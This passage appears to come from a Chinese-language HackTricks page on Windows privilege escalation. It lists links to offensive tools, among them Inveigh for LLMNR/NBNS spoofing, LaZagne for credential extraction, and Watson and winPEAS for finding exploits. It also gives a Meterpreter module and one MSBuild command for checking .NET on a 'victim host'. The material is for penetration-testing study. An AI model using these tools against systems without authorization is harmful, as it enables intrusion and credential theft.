[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh 是一个 PowerShell ADIDNS/LLMNR/mDNS/NBNS 欺骗和中间人工具。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的 privesc Windows 枚举**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 搜索已知的 privesc 漏洞（已弃用，改为 Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 本地检查 **(需要管理员权限)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 搜索已知的 privesc 漏洞（需要使用 VisualStudio 编译） ([**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举主机以查找错误配置（更多是收集信息工具而非 privesc）（需要编译） **(**[**预编译**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从许多软件中提取凭据（GitHub 上有预编译 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# 移植**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 检查错误配置（在 GitHub 上预编译的可执行文件）。不推荐。它在 Win10 上效果不好。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的错误配置（来自 Python 的 exe）。不推荐。它在 Win10 上效果不好。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于此帖创建的工具（它不需要 accesschk 正常工作，但可以使用它）。

**本地**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐有效的漏洞（本地 Python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐有效的漏洞（本地 Python）

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

您必须使用正确版本的 .NET 编译该项目（[查看此处](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看受害主机上安装的 .NET 版本，您可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考书目

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}
